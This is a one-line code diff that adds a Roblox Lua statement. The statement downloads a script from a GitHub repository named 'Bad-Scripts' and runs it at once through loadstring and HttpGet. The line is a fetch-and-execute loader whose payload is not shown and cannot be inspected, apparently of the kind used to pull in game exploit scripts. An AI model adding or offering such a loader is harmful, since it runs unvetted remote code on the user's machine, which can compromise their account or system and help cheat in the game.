@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/BitProxy/Bad-Scripts/main/sources/script0001.lua"))()
